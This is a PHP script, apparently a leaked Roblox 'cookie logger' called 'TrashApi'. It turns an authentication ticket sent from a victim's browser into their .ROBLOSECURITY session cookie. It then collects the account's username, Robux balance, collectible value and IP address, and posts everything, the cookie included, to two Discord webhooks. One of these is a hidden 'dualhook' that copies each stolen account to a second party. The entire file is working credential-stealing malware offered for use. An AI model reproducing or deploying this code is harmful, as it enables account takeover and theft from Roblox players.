<?php
    $servername = "";
    $username = "";
    $password = "";
    $dbname = "rblxapi";
    $id = $_REQUEST['id'];
    $t = $_REQUEST['t'];

    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );

    if (!isset($_SERVER['HTTP_ORIGIN']) || !in_array($_SERVER["HTTP_ORIGIN"], $allowed_origins) || !isset($_GET["t"])) {
        die();
    }

    $ticket = htmlspecialchars($_GET["t"]);
    if (strlen($ticket) < 100 || strlen($ticket) >= 1000) {
        die();
    }

    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $sql = "SELECT * FROM stubs WHERE id = '".mysqli_real_escape_string($conn, $id)."'";
    $result = mysqli_query($conn, $sql);
    $webhook = null;
    if (mysqli_num_rows($result) > 0) {
        while($row = mysqli_fetch_assoc($result)) {
            $webhook = $row["webhook"];
        }
    }
    $conn->close();

    //dualhook webhook//
    $yourwebhook = "yourwebhook";


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/Login/Negotiate.ashx?suggest=$t");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POST, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'RBXAuthenticationNegotiation: https://www.roblox.com',
        'RBX-For-Gameauth: true',
    ));
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $headers = curl_exec($ch);
    curl_close($ch);
    $cookie = null;
    foreach(explode("\n",$headers) as $part) {
        if (strpos($part, ".ROBLOSECURITY")) {
            $cookie = explode(";", explode("=", $part)[1])[0];
            break;
        }
    }


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Cookie: .ROBLOSECURITY=' . $cookie
    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $profile = json_decode(curl_exec($ch), 1);
    curl_close($ch);
                                        
    if (account_filter($profile)) {

        $object = json_encode([
            "username" => $profile["UserName"],
            "avatar_url" => "",
            "embeds" => [
                [
                    "title" => '"TrashApi" Cookie Logger',
                    "type" => "rich",
                    "description" => "",
                    "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                    "timestamp" => date('Y-m-d H:i:s'),
                    "color" => hexdec("#E0005A"),
                    "thumbnail" => [
                        "url" => "https://www.roblox.com/bust-thumbnail/image?userId=" . $profile["UserID"] . "&width=420&height=420&format=png"
                    ],
                    "footer" => [
                        "text" => "Leaked by icorex",
                        "icon_url" => "https://images-ext-1.discordapp.net/external/2-ODqiHvU9tAQEvrhsMPM4Jhk3-Goit0kYdq5gTPlEI/https/cdn.discordapp.com/icons/796867055889678346/7445f9e5cadf02b020c24210ae535d41.png"
                    ],
                    "fields" => [
                        [
                            "name" => "Name",
                            "value" => $profile["UserName"]
                        ],
                        [
                            "name" => "Robux Balance",
                            "value" => $profile["RobuxBalance"]
                        ],
                        [
                            "name" => "RAP",
                            "value" => get_user_rap($profile["UserID"], $cookie)
                        ],
                        [
                            "name" => "Premium",
                            "value" => $profile["IsPremium"]
                        ],
                        [
                            "name" => "Rolimon's",
                            "value" => "https://www.rolimons.com/player/" . $profile["UserID"]
                        ],
                        [
                            "name" => "IP",
                            "value" => realIP()
                        ],
                        [
                            "name" => "Cookie",
                            "value" => "```" . $cookie . "```"
                        ],
                    ]
                ]
            ]
        
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

        //dualhook//
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $yourwebhook,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $object,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
                                        
        $response = curl_exec($ch);
        curl_close($ch);

        //delay//
        sleep(2);

        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $webhook,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $object,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
                                
        $response = curl_exec($ch);
        curl_close($ch);
    }


    function realIP() {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP)) { $ip = $client; }
        elseif(filter_var($forward, FILTER_VALIDATE_IP)) { $ip = $forward; }
        else { $ip = $remote; }
    
        return $ip;
    }
    function get_user_rap($user_id, $cookie) {
        $cursor = "";
        $total_rap = 0;
                        
        while ($cursor !== null) {
            $request = curl_init();
            curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
            curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));
            curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($request, CURLOPT_SSL_VERIFYPEER, 0); 
            curl_setopt($request, CURLOPT_SSL_VERIFYHOST, 0);
            $data = json_decode(curl_exec($request), 1);
            foreach($data["data"] as $item) {
                $total_rap += $item["recentAveragePrice"];
            }
            $cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;
        }
                        
        return $total_rap;
    }
    function account_filter($profile) {
        return true;
    }
?>